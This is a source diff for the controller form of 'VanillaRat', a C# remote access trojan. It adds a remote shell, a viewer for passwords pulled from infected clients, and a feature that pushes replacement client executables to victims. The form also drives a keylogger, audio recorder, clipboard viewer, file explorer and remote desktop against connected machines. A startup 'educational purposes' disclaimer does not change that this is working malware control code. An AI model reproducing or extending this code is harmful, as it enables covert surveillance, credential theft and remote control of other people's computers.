@@ -1,6 +1,4 @@
-﻿using StreamLibrary;
-using StreamLibrary.UnsafeCodecs;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
@@ -10,8 +8,11 @@ using System.IO;
 using System.Linq;
 using System.Speech.Synthesis;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
+using StreamLibrary;
+using StreamLibrary.UnsafeCodecs;
 using Telepathy;
 using VanillaRat.Classes;
 using VanillaRat.Forms;
@@ -32,27 +33,28 @@ namespace VanillaRat
             lblStatus.ForeColor = Color.Red;
             lblStatus.Text = "Offline";
             GetDataLoop.Interval = ServerUpdateInterval;
-            TempDataHelper.CanDownload = true;
             TempDataHelper.CanUpload = true;
         }
 
         #region Declarations
 
-        public AudioRecorder AR = new AudioRecorder();
-        public ComputerInformation CI = new ComputerInformation();
-        public ClientRunningApps CRA = new ClientRunningApps();
-        public ClipboardTextViewer CTV = new ClipboardTextViewer();
-        public Chat C = new Chat();
-        public int CurrentSelectedID;
-        public FileExplorer FE = new FileExplorer();
-        public HardwareUsageViewer HUV = new HardwareUsageViewer();
-        public Image ImageToDisplay;
-        public Keylogger K = new Keylogger();
+        private AudioRecorder AR = new AudioRecorder();
+        private ComputerInformation CI = new ComputerInformation();
+        private ClientRunningApps CRA = new ClientRunningApps();
+        private ClipboardTextViewer CTV = new ClipboardTextViewer();
+        private Chat C = new Chat();
+        private int CurrentSelectedID;
+        private FileExplorer FE = new FileExplorer();
+        private HardwareUsageViewer HUV = new HardwareUsageViewer();
+        private Image ImageToDisplay;
+        private Keylogger K = new Keylogger();
+        private PasswordViewer PV = new PasswordViewer();
         private NotificationBox NB = new NotificationBox();
-        public OpenWebsite OW = new OpenWebsite();
-        public bool RDActive;
-        public RDC RDC = new RDC();
-        public int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;
+        private OpenWebsite OW = new OpenWebsite();
+        private RemoteShell RS = new RemoteShell();
+        private bool RDActive;
+        private RDC RDC = new RDC();
+        private int ServerUpdateInterval = Properties.Settings.Default.UpdateInterval;
         private Settings.Values Settings;
 
         #endregion Declarations
@@ -71,11 +73,9 @@ namespace VanillaRat
             for (int n = lbConnectedClients.Items.Count - 1; n >= 0; --n)
             {
                 ListViewItem LVI = lbConnectedClients.Items[n];
-                if (Convert.ToInt16(LVI.SubItems[0].Text) == ConnectionId)
-                {
-                    return LVI.SubItems[2].Text;
-                }
+                if (Convert.ToInt16(LVI.SubItems[0].Text) == ConnectionId) return LVI.SubItems[2].Text;
             }
+
             return "Client";
         }
 
@@ -232,9 +232,6 @@ namespace VanillaRat
                     break;
 
                 case 1: //Notification Type
-                    if (Encoding.ASCII.GetString(ToProcess).Contains("Error Downloading:"))
-                        if (DFF.Visible)
-                            DFF.Close();
                     MessageBox.Show(Encoding.ASCII.GetString(ToProcess), "Notification", MessageBoxButtons.OK,
                         MessageBoxIcon.Information);
                     break;
@@ -272,8 +269,7 @@ namespace VanillaRat
                         File.WriteAllBytes(TempDataHelper.DownloadLocation, ToProcess);
                         Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Downloaded Files\");
                         TempDataHelper.DownloadLocation = "";
-                        TempDataHelper.CanDownload = true;
-                        if (DFF.Visible) DFF.Close();
+                        AutoClosingMessageBox.Show("Download completed.", "Download Completed", 1000);
                     }
 
                     break;
@@ -309,12 +305,69 @@ namespace VanillaRat
                 case 16: //Message Type
                     AddMessage(ConnectionId, Encoding.ASCII.GetString(ToProcess));
                     break;
+
+                case 17: //Passwords Type
+                    AddPasswords(ConnectionId, Encoding.ASCII.GetString(ToProcess));
+                    break;
+
+                case 18: //Remote Shell Type
+                    UpdateRemoteShell(ConnectionId, Encoding.ASCII.GetString(ToProcess));
+                    break;
+
             }
         }
 
         #endregion Data Handler
 
         #region Update Functions
+
+        //Update remote shell with output
+        public void UpdateRemoteShell(int ConnectionId, string Output)
+        {
+            foreach (RemoteShell RS in Application.OpenForms.OfType<RemoteShell>())
+                if (RS.Visible && RS.ConnectionID == ConnectionId && RS.Update)
+                {
+                    if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
+                        RS.txtConsole.Text = Output;
+                    else
+                        RS.txtConsole.AppendText(Environment.NewLine + Output);
+                    return;
+                }
+
+            RS = new RemoteShell();
+            RS.ConnectionID = ConnectionId;
+            RS.Text = "Remote Shell - " + ConnectionId;
+            RS.Show();
+            if (RS.ConnectionID == ConnectionId)
+            {
+                if (string.IsNullOrWhiteSpace(RS.txtConsole.Text))
+                    RS.txtConsole.Text = Output;
+                else
+                    RS.txtConsole.AppendText(Environment.NewLine + Output);
+            }
+        }
+
+        //Add passwords to password viewer
+        public void AddPasswords(int ConnectionId, string Passwords)
+        {
+            foreach (PasswordViewer PV in Application.OpenForms.OfType<PasswordViewer>())
+                if (PV.Visible && PV.ConnectionID == ConnectionId && PV.Update)
+                {
+                    string[] PasswordsArrayRaw = Passwords.Split(new[] {"]["}, StringSplitOptions.None);
+                    foreach (string S in PasswordsArrayRaw.Skip(1).ToArray()) PV.lbPasswords.Items.Add(S);
+                    return;
+                }
+
+            PV = new PasswordViewer();
+            PV.ConnectionID = ConnectionId;
+            PV.Text = "Password Viewer - " + ConnectionId;
+            PV.Show();
+            if (PV.ConnectionID == ConnectionId)
+            {
+                string[] PasswordsArrayRaw = Passwords.Split(new[] {"]["}, StringSplitOptions.None);
+                foreach (string S in PasswordsArrayRaw.Skip(1).ToArray()) PV.lbPasswords.Items.Add(S);
+            }
+        }
 
         //Add message to chat
         public void AddMessage(int ConnectionId, string Message)
@@ -323,13 +376,9 @@ namespace VanillaRat
                 if (C.Visible && C.ConnectionID == ConnectionId && C.Update)
                 {
                     if (string.IsNullOrWhiteSpace(C.txtChat.Text))
-                    {
                         C.txtChat.Text = GetClientTagFromId(ConnectionId) + ": " + Message;
-                    }
                     else
-                    {
                         C.txtChat.AppendText(Environment.NewLine + GetClientTagFromId(ConnectionId) + ": " + Message);
-                    }
                 }
         }
 
@@ -446,10 +495,9 @@ namespace VanillaRat
         //Updates files in file browser
         public void UpdateFiles(int ConnectionId, string Files, string CurrentDirectory)
         {
-            string[] FilesArrayRaw = Files.Split(new[] { "][" }, StringSplitOptions.None);
+            string[] FilesArrayRaw = Files.Split(new[] {"]["}, StringSplitOptions.None);
             string[] FilesArray = FilesArrayRaw.Skip(1).ToArray();
             foreach (FileExplorer FE in Application.OpenForms.OfType<FileExplorer>())
-            {
                 if (FE.Visible && FE.ConnectionID == ConnectionId && FE.Update)
                 {
                     FE.lbFiles.Items.Clear();
@@ -458,13 +506,13 @@ namespace VanillaRat
                         string Filename = Functions.GetSubstringByString("{", "}", S);
                         string Extension = Functions.GetSubstringByString("<", ">", S);
                         string DateCreated = Functions.GetSubstringByString("[", "]", S);
-                        string[] ToAdd = { Filename, Extension, DateCreated };
+                        string[] ToAdd = {Filename, Extension, DateCreated};
                         var ListItem = new ListViewItem(ToAdd);
                         FE.lbFiles.Items.Add(ListItem);
                     }
+
                     return;
                 }
-            }
 
             FE = new FileExplorer();
             FE.Show();
@@ -478,7 +526,7 @@ namespace VanillaRat
                     string Filename = Functions.GetSubstringByString("{", "}", S);
                     string Extension = Functions.GetSubstringByString("<", ">", S);
                     string DateCreated = Functions.GetSubstringByString("[", "]", S);
-                    string[] ToAdd = { Filename, Extension, DateCreated };
+                    string[] ToAdd = {Filename, Extension, DateCreated};
                     var ListItem = new ListViewItem(ToAdd);
                     FE.lbFiles.Items.Add(ListItem);
                 }
@@ -514,7 +562,7 @@ namespace VanillaRat
         //Updates process list
         public void UpdateRunningAppsListbox(int ConnectionId, string Processes)
         {
-            string[] ProcessesArrayRaw = Processes.Split(new[] { "][" }, StringSplitOptions.None);
+            string[] ProcessesArrayRaw = Processes.Split(new[] {"]["}, StringSplitOptions.None);
             string[] ProcessesArray = ProcessesArrayRaw.Skip(1).ToArray();
             List<string> ProcessesList = new List<string>(ProcessesArray);
             ProcessesList.AddRange(ProcessesArray);
@@ -527,7 +575,7 @@ namespace VanillaRat
                         string PName = Functions.GetSubstringByString("{", "}", S);
                         string PID = Functions.GetSubstringByString("<", ">", S);
                         string PWindow = Functions.GetSubstringByString("[", "]", S);
-                        string[] ToAdd = { PName, PID, PWindow };
+                        string[] ToAdd = {PName, PID, PWindow};
                         var ListItem = new ListViewItem(ToAdd);
                         CRA.lbRunningProcesses.Items.Add(ListItem);
                     }
@@ -547,7 +595,7 @@ namespace VanillaRat
                     string PName = Functions.GetSubstringByString("{", "}", S);
                     string PID = Functions.GetSubstringByString("<", ">", S);
                     string PWindow = Functions.GetSubstringByString("[", "]", S);
-                    string[] ToAdd = { PName, PID, PWindow };
+                    string[] ToAdd = {PName, PID, PWindow};
                     var ListItem = new ListViewItem(ToAdd);
                     CRA.lbRunningProcesses.Items.Add(ListItem);
                 }
@@ -570,6 +618,9 @@ namespace VanillaRat
         private void Main_Load(object sender, EventArgs e)
         {
             FadeIn(5);
+            DialogResult DR = MessageBox.Show(
+                "I, the creator, am in no way responsible for any actions that you may make using this software. You take full responsibility with any action taken using this software. Please take note that this application was designed for educational purposes and should never be used maliciously. By downloading the software or source to the software, you automatically accept this agreement.",
+                "Agreement", MessageBoxButtons.OKCancel, MessageBoxIcon.None);
         }
 
         //Fade form in
@@ -606,9 +657,7 @@ namespace VanillaRat
                 CurrentSelectedID = Convert.ToInt16(LVI.SubItems[0].Text);
                 lblCurrentID.Text = "Client ID: " + CurrentSelectedID;
             }
-            catch
-            {
-            }
+            catch { }
         }
 
         #endregion Form
@@ -623,6 +672,7 @@ namespace VanillaRat
                 MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
+
             int ConnectionId = CurrentSelectedID;
             DialogResult DR =
                 MessageBox.Show(
@@ -630,6 +680,60 @@ namespace VanillaRat
                     "Confirmation", MessageBoxButtons.YesNo, MessageBoxIcon.Warning);
             if (DR == DialogResult.Yes)
                 MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("ToggleAntiProcess"));
+        }
+
+        //Update Client
+        private void btnUpdateClient_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int ConnectionId = CurrentSelectedID;
+            OpenFileDialog OFD = new OpenFileDialog();
+            OFD.Multiselect = false;
+            OFD.InitialDirectory = Environment.CurrentDirectory + @"\Clients\";
+            if (OFD.ShowDialog() == DialogResult.OK)
+            {
+                if (!TempDataHelper.CanUpload)
+                {
+                    MessageBox.Show("Error: Can not upload multiple files at once.", "Error", MessageBoxButtons.OK,
+                        MessageBoxIcon.Error);
+                }
+                else
+                {
+                    TempDataHelper.CanUpload = false;
+                    string FileString = OFD.FileName;
+                    byte[] FileBytes;
+                    using (FileStream FS = new FileStream(FileString, FileMode.Open))
+                    {
+                        FileBytes = new byte[FS.Length];
+                        FS.Read(FileBytes, 0, FileBytes.Length);
+                    }
+
+                    AutoClosingMessageBox.Show("Starting client update.", "Starting Upload", 1000);
+                    MainServer.Send(ConnectionId,
+                        Encoding.ASCII.GetBytes("StartFileReceive{[UPDATE]" + Path.GetFileName(OFD.FileName) + "}"));
+                    Thread.Sleep(80);
+                    MainServer.Send(ConnectionId, FileBytes);
+                    TempDataHelper.CanUpload = true;
+                }
+            }
+        }
+
+        //Start remote shell 
+        private void btnRemoteShell_Click(object sender, EventArgs e)
+        {
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("StartRS"));
         }
 
         //Open chat with client
@@ -640,6 +744,7 @@ namespace VanillaRat
                 MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return;
             }
+
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("OpenChat"));
             foreach (Chat C in Application.OpenForms.OfType<Chat>())
@@ -678,7 +783,7 @@ namespace VanillaRat
         }
 
         //Open website
-        private void btnOpenWebsite(object sender, EventArgs e)
+        private void btnWebsiteOpener_Click(object sender, EventArgs e)
         {
             if (lbConnectedClients.SelectedItems.Count < 0)
             {
@@ -788,7 +893,7 @@ namespace VanillaRat
 
             int ConnectionId = CurrentSelectedID;
             MainServer.Send(ConnectionId,
-                Encoding.ASCII.GetBytes("MsgBox<{<" + txtMessage.Text + ">[" + txtHeader.Text + "]{" +
+                Encoding.ASCII.GetBytes("MsgBox<{<" + messageToolStripMenuItem2.Text + ">[" + txtHeader.Text + "]{" +
                                         cbButtons.SelectedItem + "}" + "/" + cbIcons.SelectedItem + @"\}>"));
         }
 
@@ -831,7 +936,7 @@ namespace VanillaRat
                 MBI = MessageBoxIcon.Stop;
             else if (cbIcons.SelectedItem.Equals("Warning")) MBI = MessageBoxIcon.Warning;
 
-            MessageBox.Show(txtMessage.Text, txtHeader.Text, MBB, MBI);
+            MessageBox.Show(messageToolStripMenuItem2.Text, txtHeader.Text, MBB, MBI);
 
             #endregion Button & Icon conditional statements
         }
@@ -925,6 +1030,7 @@ namespace VanillaRat
             }
 
             int ConnectionId = CurrentSelectedID;
+
             MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("[<TTS>]" + txtTTSText.Text));
         }
 
@@ -937,6 +1043,7 @@ namespace VanillaRat
                     MessageBoxIcon.Error);
                 return;
             }
+
             using (SpeechSynthesizer Synth = new SpeechSynthesizer())
             {
                 Synth.SetOutputToDefaultAudioDevice();
@@ -944,11 +1051,24 @@ namespace VanillaRat
             }
         }
 
+        //Get passwords from client
+        private void btnGetPasswords_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("This feature does not work yet!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            return;
+            if (lbConnectedClients.SelectedItems.Count < 0)
+            {
+                MessageBox.Show("Please select a client!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            int ConnectionId = CurrentSelectedID;
+            MainServer.Send(ConnectionId, Encoding.ASCII.GetBytes("GetStoredPasswords"));
+        }
+
         #endregion Client Functions
 
         #region Remote Desktop
-
-
 
         //Convert byte array to image
         public Image ByteArrayToImage(byte[] ByteArrayIn)
@@ -957,7 +1077,7 @@ namespace VanillaRat
             using (var MS = new MemoryStream(ByteArrayIn))
             {
                 try
-                {                   
+                {
                     return UC.DecodeData(MS);
                 }
                 catch
@@ -968,7 +1088,7 @@ namespace VanillaRat
         }
 
         //Start remote desktop
-        private void btnRemoteDesktop_Click(object sender, EventArgs e)
+        private void btnStartRD_Click(object sender, EventArgs e)
         {
             try
             {
@@ -995,9 +1115,7 @@ namespace VanillaRat
                 RDC.Show();
                 bwUpdateImage.RunWorkerAsync();
             }
-            catch
-            {
-            }
+            catch { }
         }
 
         //Update picture box image
@@ -1015,24 +1133,24 @@ namespace VanillaRat
 
                     using (Bitmap SRC = new Bitmap(ImageToDisplay))
                     {
-                        Bitmap DEST = new Bitmap(RDC.pbDesktop.Width, RDC.pbDesktop.Height, PixelFormat.Format32bppPArgb);
+                        Bitmap DEST = new Bitmap(RDC.pbDesktop.Width, RDC.pbDesktop.Height,
+                            PixelFormat.Format32bppPArgb);
                         using (Graphics G = Graphics.FromImage(DEST))
                         {
                             G.DrawImage(SRC, new Rectangle(Point.Empty, DEST.Size));
                         }
+
                         if (RDC.pbDesktop.InvokeRequired)
-                            RDC.pbDesktop.Invoke((MethodInvoker)delegate { RDC.pbDesktop.Image = DEST; });
+                            RDC.pbDesktop.Invoke((MethodInvoker) delegate { RDC.pbDesktop.Image = DEST; });
                         else
                             RDC.pbDesktop.Image = DEST;
                     }
-                        
-                    await Task.Delay(10);
+
+                    await Task.Delay(15);
                 }
-                catch
-                {
-                }
+                catch { }
         }
 
-        #endregion Remote Desktop        
+        #endregion Remote Desktop                                        
     }
 }
